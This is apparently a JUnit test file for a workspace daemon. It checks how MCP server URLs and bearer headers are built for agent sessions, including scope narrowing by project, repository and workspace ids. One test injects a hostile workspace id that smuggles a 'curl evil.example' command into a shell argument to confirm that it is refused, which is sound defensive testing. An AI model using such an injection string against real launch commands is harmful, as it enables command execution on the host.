package eu.wohlben.qits.workspacedaemon;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.agents.AgentMcpNarrowing;
import eu.wohlben.qits.agents.AgentMcpScope;
import eu.wohlben.qits.agents.LocalMcp;
import eu.wohlben.qits.agents.McpEndpoints;
import eu.wohlben.qits.agents.ScopedMcp;
import eu.wohlben.qits.commands.InvalidCommandRequestException;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.junit.jupiter.api.Test;

/**
 * This daemon's half of the {@link eu.wohlben.qits.agents.AgentMcpServers} seam.
 *
 * <p>The scope mapping itself is proven <b>in the harness library</b>, against a fixture copy of
 * this class, where the rendered command lines are asserted byte for byte on both harnesses. What is
 * proven here is the half the library cannot have: the urls this daemon builds for a given narrowing,
 * and the narrowings it refuses.
 *
 * <p>Those refusals are the reason the seam exists at all. Its default implementation ignores the
 * narrowing and answers the scope's own mapping, which makes the editor's three checkboxes a
 * description of what the daemon already did rather than something an operator can change — so
 * {@code honoursNarrowing()} being true is itself an assertion below.
 */
class WorkspaceMcpServersTest {

  private static final String PROJECT = "22222222-2222-2222-2222-222222222222";
  private static final String REPO = "qits-stt";
  private static final String WORKSPACE = "ws-1";

  private static final McpEndpoints ENDPOINTS =
      new McpEndpoints() {
        @Override
        public String mcpUrl(String server) {
          return switch (server) {
            case "repository" -> "http://qits:8080/projects/mcp";
            case "observability" -> "http://qits:8080/observability/mcp";
            case "actions" -> "http://qits:8080/actions/mcp";
            default -> throw new IllegalArgumentException("Unknown MCP server: " + server);
          };
        }

        @Override
        public String projectId() {
          return PROJECT;
        }
      };

  private static final String PLATFORM_URL = "http://qits-platform-access-mcp-service:8080/mcp";

  private static final String TOKEN = "tok-abc123";

  private final WorkspaceMcpServers servers =
      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.empty());

  private final WorkspaceMcpServers withoutPlatformUrl =
      new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.empty(), Optional.empty());

  private final WorkspaceMcpServers withToken =
      new WorkspaceMcpServers(
          ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.of(TOKEN));

  @Test
  void theSeamIsImplementedRatherThanLeftOnTheLibrarysDefault() {
    // False here would mean every launch that attaches a server records that its addressing was
    // this daemon's guess rather than the document's instruction — visible, but still a lie on the
    // editor's form.
    assertTrue(servers.honoursNarrowing());
  }

  @Test
  void everyLaunchGetsTheImagesBrowserWithEveryToolPreApproved() {
    // The image ships qits-browser-mcp; the key and the program name are the contract with it.
    LocalMcp browser = servers.localServers().get(0);
    assertEquals(1, servers.localServers().size());
    assertEquals("browser", browser.key());
    assertEquals("qits-browser-mcp", browser.command());
    assertEquals(List.of("mcp__browser__*"), browser.allowedTools());
    assertEquals(servers.localServers(), withoutPlatformUrl.localServers());
  }

  @Test
  void repositoryScopeAttachesTheNarrowedRepositoryServerAndTelemetryBesideIt() {
    List<ScopedMcp> attached = servers.serversFor(AgentMcpScope.REPOSITORY);

    assertEquals(2, attached.size());
    assertEquals(
        "http://qits:8080/projects/mcp?projectId="
            + PROJECT
            + "&repositoryId="
            + REPO
            + "&workspaceId="
            + WORKSPACE,
        attached.get(0).url());
    // No projectId: qits-observability has no notion of one, and its tool filter hides everything
    // unless both of the other two are present.
    assertEquals(
        "http://qits:8080/observability/mcp?repositoryId=" + REPO + "&workspaceId=" + WORKSPACE,
        attached.get(1).url());
  }

  @Test
  void theNarrowingTheDocumentAsksForIsWhatIsBuilt() {
    // The canonical order — projectId, repositoryId, workspaceId — is contract rather than detail:
    // the rendered command line is asserted as a literal on both harnesses.
    assertEquals(
        "http://qits:8080/projects/mcp?projectId=" + PROJECT + "&workspaceId=" + WORKSPACE,
        serverFor("repository", new AgentMcpNarrowing(true, false, true)).url());
    assertEquals(
        "http://qits:8080/projects/mcp?repositoryId=" + REPO,
        serverFor("repository", new AgentMcpNarrowing(false, true, false)).url());
  }

  @Test
  void noNarrowingAtAllIsTheWholePlatformRatherThanARefusal() {
    assertEquals(
        "http://qits:8080/projects/mcp",
        serverFor("repository", new AgentMcpNarrowing(false, false, false)).url());
  }

  @Test
  void aServerKeepsItsShippedPreApprovalWhateverTheNarrowing() {
    // Pre-approval is policy about what this product's agents may do without asking, keyed by
    // server; it is not something the narrowing moves.
    assertEquals(
        servers.serversFor(AgentMcpScope.REPOSITORY).get(0).allowedTools(),
        serverFor("repository", new AgentMcpNarrowing(true, true, true)).allowedTools());
  }

  @Test
  void aProjectNarrowingOnAProjectBlindServerIsRefusedRatherThanDropped() {
    // Dropping the parameter would answer a BROADER url than was asked for, which is the one
    // failure a narrowing exists to prevent.
    InvalidCommandRequestException refused =
        assertThrows(
            InvalidCommandRequestException.class,
            () -> servers.serverFor(
                "observability", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(true, true, true)));
    assertTrue(refused.getMessage().contains("observability"), refused.getMessage());

    assertThrows(
        InvalidCommandRequestException.class,
        () -> servers.serverFor(
            "actions", AgentMcpScope.ACTIONS, new AgentMcpNarrowing(true, true, false)));
  }

  @Test
  void anIdOutsideThePlatformsGrammarNeverReachesAShellArgument() {
    // The url ends up inside a single-quoted launch argument and the renderer does no escaping of
    // its own, so the grammar check is the boundary.
    WorkspaceMcpServers hostile =
        new WorkspaceMcpServers(
            ENDPOINTS,
            REPO,
            "ws-1' && curl evil.example",
            Optional.of(PLATFORM_URL),
            Optional.empty());

    assertThrows(
        InvalidCommandRequestException.class,
        () -> hostile.serverFor(
            "repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, true)));
  }

  @Test
  void aKeyThisDaemonDoesNotServeAnswersEmptyRatherThanInventingAUrl() {
    // The launch turns this into its own refusal naming the surface — a session missing a server it
    // was configured with looks entirely normal and cannot do half its job.
    assertEquals(
        Optional.empty(),
        servers.serverFor("weather", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false)));
  }

  @Test
  void scopeDoesNotVetoAKeyOnceTheDocumentHasNamedItAndItsNarrowing() {
    // serversFor omits observability at PROJECT scope only because the scope carries no repository
    // or workspace to narrow it with. A document that asks for that narrowing has said what the
    // scope could not, and refusing it on the scope's say-so would make the checkbox a lie the
    // other way round.
    assertEquals(
        "http://qits:8080/observability/mcp?repositoryId=" + REPO + "&workspaceId=" + WORKSPACE,
        serverFor("observability", new AgentMcpNarrowing(false, true, true), AgentMcpScope.PROJECT)
            .url());
  }

  private ScopedMcp serverFor(String key, AgentMcpNarrowing narrowing) {
    return serverFor(key, narrowing, AgentMcpScope.REPOSITORY);
  }

  private ScopedMcp serverFor(String key, AgentMcpNarrowing narrowing, AgentMcpScope scope) {
    return servers.serverFor(key, scope, narrowing).orElseThrow();
  }

  /**
   * The central {@code qits} platform MCP server (qits-630) — present exactly when {@code
   * qits.platform-mcp.url} is configured and the surface's document attaches it, on every one of
   * this daemon's four surfaces: {@code epic.chat}, {@code epic.agent}, {@code workspace.chat} and
   * {@code workspace.agent}. The document (built by qits-projects-service's {@code
   * AgentSurfaceDefaults}, outside this repository) is what carries the per-surface toggle and the
   * scope those four always ask with — all of it narrows to {@link AgentMcpScope#REPOSITORY} here —
   * so one assertion stands for all four rather than four identical copies of it.
   */
  private static final List<AgentMcpScope> WORKSPACE_SURFACE_SCOPES =
      List.of(
          AgentMcpScope.REPOSITORY, // epic.chat
          AgentMcpScope.REPOSITORY, // epic.agent
          AgentMcpScope.REPOSITORY, // workspace.chat
          AgentMcpScope.REPOSITORY); // workspace.agent

  @Test
  void qitsAttachesOnEveryWorkspaceSurfaceWhenTheUrlIsConfigured() {
    for (AgentMcpScope scope : WORKSPACE_SURFACE_SCOPES) {
      assertEquals(
          Optional.of(new ScopedMcp("qits", PLATFORM_URL, List.of())),
          servers.serverFor("qits", scope, new AgentMcpNarrowing(false, false, false)));
    }
  }

  @Test
  void qitsIsAbsentRatherThanRefusingOnEveryWorkspaceSurfaceWhenTheUrlIsNotConfigured() {
    for (AgentMcpScope scope : WORKSPACE_SURFACE_SCOPES) {
      assertEquals(
          Optional.empty(),
          withoutPlatformUrl.serverFor("qits", scope, new AgentMcpNarrowing(false, false, false)));
    }
  }

  @Test
  void qitsCarriesNoQueryParametersWhateverTheNarrowingAsks() {
    // The session is scoped by its own bearer on every call, not by the url — unlike repository
    // and observability, a narrowing request (even one asking for all three ids) changes nothing.
    assertEquals(
        PLATFORM_URL, serverFor("qits", new AgentMcpNarrowing(true, true, true)).url());
  }

  @Test
  void qitsIsAbsentFromTheHostedDefaultMapping() {
    // The hosted default (serversFor) is what a container born without a mounted document falls
    // back to, and that is "the surface turns it off" in its most total form: nothing there has a
    // per-surface toggle to turn qits on with, so a pre-qits-630 container must keep attaching
    // exactly what it always attached. The per-surface switch is the document's
    // AgentMcpAttachment list (qits-projects-service's AgentSurfaceDefaults), reached only through
    // serverFor above — never through here.
    for (AgentMcpScope scope : AgentMcpScope.values()) {
      assertTrue(
          servers.serversFor(scope).stream().noneMatch(server -> server.key().equals("qits")),
          scope.toString());
    }
  }

  @Test
  void withATokenTheThreePlatformServersCarryTheBearerHeaderAndActionsDoesNot() {
    Map<String, String> expected = Map.of("Authorization", "Bearer " + TOKEN);

    List<ScopedMcp> actionsScope = withToken.serversFor(AgentMcpScope.ACTIONS);
    assertEquals(3, actionsScope.size());
    assertEquals(Map.of(), actionsScope.get(0).headers()); // actions
    assertEquals(expected, actionsScope.get(1).headers()); // repository
    assertEquals(expected, actionsScope.get(2).headers()); // observability

    List<ScopedMcp> repositoryScope = withToken.serversFor(AgentMcpScope.REPOSITORY);
    assertEquals(expected, repositoryScope.get(0).headers());
    assertEquals(expected, repositoryScope.get(1).headers());

    List<ScopedMcp> projectScope = withToken.serversFor(AgentMcpScope.PROJECT);
    assertEquals(expected, projectScope.get(0).headers());

    assertEquals(
        expected,
        withToken
            .serverFor("repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
            .orElseThrow()
            .headers());
    assertEquals(
        expected,
        withToken
            .serverFor("observability", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, true, true))
            .orElseThrow()
            .headers());
    assertEquals(
        expected,
        withToken
            .serverFor("qits", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
            .orElseThrow()
            .headers());

    assertEquals(expected, withToken.platformHeaders());
  }

  @Test
  void aDirectWorkspacesTokenRendersAsHeadersAndNeverAHeadersHelper() {
    // Since qits-1084 an admin or editor (DIRECT) workspace carries a QITS_TOKEN exactly like a
    // runner-placed one, so headersFor renders the very same static Bearer map for both — there is
    // no DIRECT-only branch here to diverge. ScopedMcp carries only `headers`; it has no
    // headersHelper field for a populated map to ever compete with, so there is nothing here for
    // the harness library to choose a helper script over.
    ScopedMcp repository =
        withToken
            .serverFor(
                "repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
            .orElseThrow();

    assertEquals(Map.of("Authorization", "Bearer " + TOKEN), repository.headers());
  }

  @Test
  void withoutATokenEveryServerIsByteIdenticalToTodays() {
    // Blank-but-present (the un-filled "${QITS_TOKEN:}" default) and genuinely absent both answer
    // empty — the exact same shape every server rendered before this header existed.
    WorkspaceMcpServers blankToken =
        new WorkspaceMcpServers(ENDPOINTS, REPO, WORKSPACE, Optional.of(PLATFORM_URL), Optional.of(""));

    for (AgentMcpScope scope : AgentMcpScope.values()) {
      for (ScopedMcp server : servers.serversFor(scope)) {
        assertEquals(Map.of(), server.headers(), server.key());
      }
      for (ScopedMcp server : blankToken.serversFor(scope)) {
        assertEquals(Map.of(), server.headers(), server.key());
      }
    }
    assertEquals(Map.of(), servers.platformHeaders());
    assertEquals(Map.of(), blankToken.platformHeaders());
    assertEquals(Map.of(), withoutPlatformUrl.platformHeaders());

    assertEquals(
        Map.of(),
        servers
            .serverFor("repository", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
            .orElseThrow()
            .headers());
    assertEquals(
        Map.of(),
        servers
            .serverFor("qits", AgentMcpScope.REPOSITORY, new AgentMcpNarrowing(false, false, false))
            .orElseThrow()
            .headers());
  }
}
